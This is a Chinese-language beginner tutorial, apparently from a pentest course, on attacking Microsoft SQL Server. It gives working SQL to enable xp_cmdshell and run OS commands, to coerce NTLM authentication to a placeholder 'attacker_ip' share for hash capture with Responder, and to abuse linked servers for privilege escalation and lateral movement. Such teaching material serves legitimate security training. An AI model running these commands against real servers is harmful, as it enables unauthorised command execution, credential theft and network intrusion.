# MSSQL攻击 - 新手章节指南

## 这个目录是干什么的？

Microsoft SQL Server 是企业中常见的数据库。它不仅存储数据，还可以被用来执行系统命令、进行横向移动。这个目录教你如何利用 MSSQL 进行攻击。

---

## 为什么要学这个？

```
MSSQL 的价值：
├── 企业核心数据存储在这里
├── 通常有高权限的服务账户
├── 可以执行操作系统命令
├── 可以连接到其他 SQL Server
└── 是域渗透的重要跳板

现实场景：
├── 你发现了一个 SQL 注入漏洞
├── 或者获得了数据库凭证
├── 利用 MSSQL 执行系统命令
├── 获得服务器的控制权
└── 利用链接服务器横向移动
```

---

## 通俗理解核心概念

### xp_cmdshell - 执行系统命令

```
什么是 xp_cmdshell？
├── MSSQL 的扩展存储过程
├── 可以执行操作系统命令
├── 默认是禁用的
├── 但 sysadmin 可以启用它
└── 是 MSSQL 攻击的核心

类比：
├── MSSQL 是一个管家
├── xp_cmdshell 是管家的"万能钥匙"
├── 有了它，管家可以做任何事
└── 包括执行系统命令
```

### UNC 路径注入

```
什么是 UNC 路径？
├── Universal Naming Convention
├── 格式：\\server\share
├── 用于访问网络资源
└── 会触发 NTLM 认证

攻击原理：
├── 让 MSSQL 访问你控制的 UNC 路径
├── MSSQL 会用服务账户进行认证
├── 你捕获 NTLM 哈希
├── 可以破解或进行中继攻击
└── 获得服务账户的凭证
```

### 链接服务器（Linked Server）

```
什么是链接服务器？
├── MSSQL 可以连接到其他数据库
├── 包括其他 MSSQL、Oracle 等
├── 可以跨服务器执行查询
└── 可能有不同的权限

攻击价值：
├── 服务器 A 连接到服务器 B
├── 你在 A 上是普通用户
├── 但链接到 B 时可能是 sysadmin
├── 利用这个权限差异
└── 实现权限提升或横向移动
```

## 实践任务清单

### 任务1：枚举 MSSQL 信息

```sql
-- 获取服务器信息
SELECT @@version;
SELECT @@servername;
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

-- 列出数据库
SELECT name FROM sys.databases;

-- 列出用户
SELECT name FROM sys.server_principals;

-- 检查 xp_cmdshell 状态
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

### 任务2：启用并使用 xp_cmdshell

```sql
-- 启用高级选项
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- 启用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 执行系统命令
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'net user';
```

### 任务3：UNC 路径注入捕获哈希

```sql
-- 在攻击机上启动 Responder
-- sudo responder -I eth0

-- 在 MSSQL 中执行
EXEC xp_dirtree '\\attacker_ip\share';

-- 或使用
EXEC xp_fileexist '\\attacker_ip\share\file';

-- Responder 会捕获 NTLM 哈希
```

### 任务4：枚举和利用链接服务器

```sql
-- 列出链接服务器
SELECT * FROM sys.servers;

-- 在链接服务器上执行查询
SELECT * FROM OPENQUERY("LinkedServer", 'SELECT @@version');

-- 检查在链接服务器上的权限
SELECT * FROM OPENQUERY("LinkedServer", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- 如果有 sysadmin 权限，启用 xp_cmdshell
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT LinkedServer;
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT LinkedServer;
EXEC ('xp_cmdshell ''whoami''') AT LinkedServer;
```
